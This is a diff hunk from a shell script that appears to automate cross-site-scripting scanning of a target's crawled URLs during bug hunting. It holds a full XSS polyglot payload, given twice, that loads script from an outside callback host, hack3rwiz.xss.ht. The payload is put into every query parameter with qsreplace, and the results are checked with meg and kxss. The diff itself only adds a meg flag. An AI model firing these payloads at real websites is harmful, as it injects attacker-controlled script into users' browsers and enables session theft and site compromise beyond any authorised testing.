@@ -9,7 +9,7 @@ cat ${1}.urls | grep "=" | inscope | sort -u > gf_xss
 rm gf_xss
 cd xss
 cat ../${1}.aliveURLs| grep -v FUZZ | sed 's/,,.*//g' | sed 's/,/\n/g' | grep ${1} | sed 's/^.*http/http/g' | grep "=" | egrep -iv ".(js|jpg|woff|pdf|png|jpeg|gif|css|tif|tiff|ttf|woff2|ico|svg|txt)" | qsreplace -a | qsreplace "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=eval('var a=document.createElement(\'script\');a.src=\'https://hack3rwiz.xss.ht\';document.body.appendChild(a)') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--\><script src=https://hack3rwiz.xss.ht></script>//>\x3e" > hosts
-meg -c 400 -d 20 ./
+meg -L -c 400 -d 20 ./
 cat ../${1}.aliveURLs| grep -v FUZZ | sed 's/,,.*//g' | sed 's/,/\n/g' | grep ${1} | sed 's/^.*http/http/g' | grep "=" | egrep -iv ".(js|jpg|woff|pdf|png|jpeg|gif|css|tif|tiff|ttf|woff2|ico|svg|txt)" | qsreplace -a | qsreplace | kxss |anew kxsss | notify
 #cat ../${1}.urls | grep "=" | kxss | anew kxsss | notify
 cat kxsss| awk -F "on " '{print $2}' | sort -u | qsreplace "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=eval('var a=document.createElement(\'script\');a.src=\'https://hack3rwiz.xss.ht\';document.body.appendChild(a)') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--\><script src=https://hack3rwiz.xss.ht></script>//>\x3e"> testpolyxss
